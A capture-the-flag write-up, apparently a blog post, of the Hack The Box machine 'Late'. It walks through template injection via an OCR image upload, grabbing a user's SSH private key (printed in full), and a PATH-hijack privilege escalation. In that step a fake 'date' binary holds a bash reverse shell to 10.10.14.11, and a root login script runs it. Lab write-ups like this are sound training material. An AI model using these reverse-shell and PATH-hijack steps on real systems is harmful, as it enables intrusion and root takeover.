---
title: 'HTB: Late'
date: 2023-06-08 13:55:49
tags:
- ssti
- web
- linux
category:
- HTB
---

![](/late/late.png)

Late is an easy machine that has a unique server-side template injection via the image ocr functionality provided by the site.  Once you’re on the box there are two key findings.  First is that the user has write permissions to a folder in the root $PATH.  The second is that a script runs as root every time someone remotes into the box.  The script in question uses several system commands that can be “tricked” into using our own commands by placing them closer to the front of $PATH.

---

# Getting User

Start out by adding the box to our host file.

```bash
sudo sh -c 'echo "10.10.11.156 late.htb" >> /etc/hosts'
```

## Recon 

Nmap and Gobuster did not provide anything of relevance other than the target is running a web server.
```bash
# Nmap 7.92 scan initiated Fri May 20 15:46:11 2022 as: nmap -v -sC -sV -oA scan.namp 10.10.11.156
Nmap scan report for 10.10.11.156
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA)
|   256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA)
|_  256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD
|_http-favicon: Unknown favicon MD5: 1575FDF0E164C3DB0739CF05D9315BDF
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Late - Best online image tools
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/local/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri May 20 15:46:27 2022 -- 1 IP address (1 host up) scanned in 15.81 seconds
```
```bash
/assets               (Status: 301) [Size: 194] [--> http://10.10.11.156/assets/]
```
### Home Page

![](/late/home_page.png)

### Upload Page

Click the link `late free online photo editor` under the frequently asked questions section. 

As you might expect from looking at the page this site takes an image, reads the text off that image, then provides the text via a download. 

I found the best way to create images that would pars correctly was to simply use the TextEdit app (on mac), then press `shift + options + t` to change from rich text to plain text.  Next use the screenshot utility to create the image. Using notepad and the snipping tool worked as well on windows.

![](/late/img_to_text_upload.png)

## SSTI

### First Image

Check to see if the site is vulnerable to template injection with `{{ 7 * 7 }}`.

![](/late/maths.png)

```text
<p>49
</p>
```

With the response of `49` we can infer that we have ssti. 

### Second Image

Start looking around for users

![](/late/ls_home.png)

```text
<p>total 12K
4.0K drwxr-xr-x  7 svc_acc svc_acc 4.0K Jun  8 18:33 svc_acc/
4.0K drwxr-xr-x 23 root    root    4.0K Apr  7 13:51 ../
4.0K drwxr-xr-x  3 root    root    4.0K Jan  5 10:44 ./

</p>
```

Based off the download we have discovered the user account `svc_acc`

Technically from here we should be able to get a revers shell but let's look around a bit first.

### Third Image

![](/late/ls_svc.png)

Lets see what the user `scv_acc` has in their home directory.

```text
<p>total 256K
 24K -rwxrwxr-x 1 svc_acc svc_acc  22K Jun  8 18:33 a.out*
4.0K drwxr-xr-x 7 svc_acc svc_acc 4.0K Jun  8 18:33 ./
8.0K -rw------- 1 svc_acc svc_acc 8.0K Jun  8 18:33 .viminfo
 24K -rw-rw-r-- 1 svc_acc svc_acc  23K Jun  8 18:33 50135.c
4.0K drwx------ 3 svc_acc svc_acc 4.0K Jun  8 17:20 .gnupg/
160K -rwxrwxr-x 1 svc_acc svc_acc 157K Jun  8 17:19 linpeas.sh*
4.0K drwxrwxr-x 7 svc_acc svc_acc 4.0K Jun  8 16:16 app/
4.0K -rw-r----- 1 root    svc_acc   33 Jun  7 18:03 user.txt
4.0K drwx------ 3 svc_acc svc_acc 4.0K Apr  7 13:51 .cache/
4.0K drwx------ 2 svc_acc svc_acc 4.0K Apr  7 11:08 .ssh/
   0 lrwxrwxrwx 1 svc_acc svc_acc    9 Jan 16 18:45 .bash_history -&gt; /dev/null
4.0K drwxrwxr-x 5 svc_acc svc_acc 4.0K Jan  5 12:13 .local/
4.0K drwxr-xr-x 3 root    root    4.0K Jan  5 10:44 ../
4.0K -rw-r--r-- 1 svc_acc svc_acc 3.7K Apr  4  2018 .bashrc
4.0K -rw-r--r-- 1 svc_acc svc_acc  807 Apr  4  2018 .profile

</p>
```

### Forth Image

![](/late/ssh.png)

Snag the ssh private key.
```text
<p>-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAqe5XWFKVqleCyfzPo4HsfRR8uF/P/3Tn+fiAUHhnGvBBAyrM
HiP3S/DnqdIH2uqTXdPk4eGdXynzMnFRzbYb+cBa+R8T/nTa3PSuR9tkiqhXTaEO
bgjRSynr2NuDWPQhX8OmhAKdJhZfErZUcbxiuncrKnoClZLQ6ZZDaNTtTUwpUaMi
/mtaHzLID1KTl+dUFsLQYmdRUA639xkz1YvDF5ObIDoeHgOU7rZV4TqA6s6gI7W7
d137M3Oi2WTWRBzcWTAMwfSJ2cEttvS/AnE/B2Eelj1shYUZuPyIoLhSMicGnhB7
7IKpZeQ+MgksRcHJ5fJ2hvTu/T3yL9tggf9DsQIDAQABAoIBAHCBinbBhrGW6tLM
fLSmimptq/1uAgoB3qxTaLDeZnUhaAmuxiGWcl5nCxoWInlAIX1XkwwyEb01yvw0
ppJp5a+/OPwDJXus5lKv9MtCaBidR9/vp9wWHmuDP9D91MKKL6Z1pMN175GN8jgz
W0lKDpuh1oRy708UOxjMEalQgCRSGkJYDpM4pJkk/c7aHYw6GQKhoN1en/7I50IZ
uFB4CzS1bgAglNb7Y1bCJ913F5oWs0dvN5ezQ28gy92pGfNIJrk3cxO33SD9CCwC
T9KJxoUhuoCuMs00PxtJMymaHvOkDYSXOyHHHPSlIJl2ZezXZMFswHhnWGuNe9IH
Ql49ezkCgYEA0OTVbOT/EivAuu+QPaLvC0N8GEtn7uOPu9j1HjAvuOhom6K4troi
WEBJ3pvIsrUlLd9J3cY7ciRxnbanN/Qt9rHDu9Mc+W5DQAQGPWFxk4bM7Zxnb7Ng
Hr4+hcK+SYNn5fCX5qjmzE6c/5+sbQ20jhl20kxVT26MvoAB9+I1ku8CgYEA0EA7
t4UB/PaoU0+kz1dNDEyNamSe5mXh/Hc/mX9cj5cQFABN9lBTcmfZ5R6I0ifXpZuq
0xEKNYA3HS5qvOI3dHj6O4JZBDUzCgZFmlI5fslxLtl57WnlwSCGHLdP/knKxHIE
uJBIk0KSZBeT8F7IfUukZjCYO0y4HtDP3DUqE18CgYBgI5EeRt4lrMFMx4io9V3y
3yIzxDCXP2AdYiKdvCuafEv4pRFB97RqzVux+hyKMthjnkpOqTcetysbHL8k/1pQ
GUwuG2FQYrDMu41rnnc5IGccTElGnVV1kLURtqkBCFs+9lXSsJVYHi4fb4tZvV8F
ry6CZuM0ZXqdCijdvtxNPQKBgQC7F1oPEAGvP/INltncJPRlfkj2MpvHJfUXGhMb
Vh7UKcUaEwP3rEar270YaIxHMeA9OlMH+KERW7UoFFF0jE+B5kX5PKu4agsGkIfr
kr9wto1mp58wuhjdntid59qH+8edIUo4ffeVxRM7tSsFokHAvzpdTH8Xl1864CI+
Fc1NRQKBgQDNiTT446GIijU7XiJEwhOec2m4ykdnrSVb45Y6HKD9VS6vGeOF1oAL
K6+2ZlpmytN3RiR9UDJ4kjMjhJAiC7RBetZOor6CBKg20XA1oXS7o1eOdyc/jSk0
kxruFUgLHh7nEx/5/0r8gmcoCvFn98wvUPSNrgDJ25mnwYI0zzDrEw==
-----END RSA PRIVATE KEY-----</p>
```

Now that we have the private key we can save it to a file and ssh into the box

```bash
$ ssh -i private_key svc_acc@10.10.11.156
svc_acc@late:~$
```

# Getting Root

The next step was to run [linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS).  The first thing linpeas noted was that we had write privileges to `/usr/local/sbin/`. 

## Write Path Abuse

```bash 
╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses
/home/svc_acc/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
New path exported: /home/svc_acc/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

Taking a look at the system path `/usr/local/sbin` is close to the front of the line.  Meaning it's going to be one of the first places Linux is going to look to run commands.

```bash
svc_acc@late:~$ echo $PATH
/home/svc_acc/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

`/usr/local/sbin` is owned by `svc_acc` so we can write to it.

```bash
svc_acc@late:~$ ls -Flaths /usr/local
total 40K
4.0K drwxr-xr-x  2 svc_acc svc_acc 4.0K Jun 21 21:16 sbin/
4.0K drwxr-xr-x  7 root    root    4.0K Apr  7 13:51 share/
4.0K drwxr-xr-x  2 root    root    4.0K Apr  4 13:20 bin/
4.0K drwxr-xr-x  4 root    root    4.0K Jan 12 09:31 lib/
4.0K drwxr-xr-x 10 root    root    4.0K Aug  6  2020 ./
4.0K drwxr-xr-x 10 root    root    4.0K Aug  6  2020 ../
4.0K drwxr-xr-x  2 root    root    4.0K Aug  6  2020 etc/
4.0K drwxr-xr-x  2 root    root    4.0K Aug  6  2020 games/
4.0K drwxr-xr-x  2 root    root    4.0K Aug  6  2020 include/
   0 lrwxrwxrwx  1 root    root       9 Aug  6  2020 man -> share/man/
4.0K drwxr-xr-x  2 root    root    4.0K Aug  6  2020 src/
```

within `usr/local/sbin` is a `ssh-alert.sh` script.

```bash
svc_acc@late:/usr/local/sbin$ cd
svc_acc@late:~$ ls -Flaths /usr/local/sbin/
total 12K
4.0K drwxr-xr-x  2 svc_acc svc_acc 4.0K Jun 21 21:16 ./
4.0K -rwxr-xr-x  1 svc_acc svc_acc  433 Jun 21 21:16 ssh-alert.sh*
4.0K drwxr-xr-x 10 root    root    4.0K Aug  6  2020 ../
```

Taking a look at the script we see that it's taking note of when users login.  

```bash
svc_acc@late:/usr/local/sbin$ cat ssh-alert.sh
#!/bin/bash

RECIPIENT="root@late.htb"
SUBJECT="Email from Server Login: SSH Alert"

BODY="
A SSH login was detected.

        User:        $PAM_USER
        User IP Host: $PAM_RHOST
        Service:     $PAM_SERVICE
        TTY:         $PAM_TTY
        Date:        `date`
        Server:      `uname -a`
"

if [ ${PAM_TYPE} = "open_session" ]; then
        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
fi


svc_acc@late:/usr/local/sbin$
```

Using `pspy` we can see that the script is getting ran as a root user.  I might have been able to infer that given the $PAM usage but it never hurts to check.

```bash
2022/06/22 14:41:21 CMD: UID=0    PID=2059   | sshd: svc_acc [priv]
2022/06/22 14:41:21 CMD: UID=0    PID=2060   | /bin/bash /usr/local/sbin/ssh-alert.sh
```

We can now take advantage of the fact that we can execute a script (`ssh-alert.sh`) as root that takes some variables that we can control.  The next step is to create that variable.

## Making a custom `date` command

One of the commands that `ssh-alert.sh` uses is the `date` command.  Let's make a new `date` command.

```bash
svc_acc@late:/usr/local/sbin$ which date
/bin/date
svc_acc@late:/usr/local/sbin$ echo "/bin/bash -i >& /dev/tcp/10.10.14.11/2346 0>&1" > date
svc_acc@late:/usr/local/sbin$ chmod +x date
svc_acc@late:/usr/local/sbin$ which date
/usr/local/sbin/date
```

Setup the netcat listener and exit out of the original ssh session.  This will trigger our reverse shell to execute when `ssh-alert.sh` calls `date`.

```bash
[ none@microbial web ]$  nc -lvn 2346
bash: cannot set terminal process group (30241): Inappropriate ioctl for device
bash: no job control in this shell
root@late:/# id
id
uid=0(root) gid=0(root) groups=0(root)
root@late:/# cd /root
cd /root
root@late:/root# ls
ls
root.txt
scripts
root@late:/root# cat root.txt
cat root.txt
7942.........................
root@late:/root#
```

## References:

[IndominusByte excellent writeup on ssti](https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee)

[pwn function video on ssti](https://www.youtube.com/watch?v=SN6EVIG4c-0)

[info on PAM](https://en.wikipedia.org/wiki/Linux_PAM)
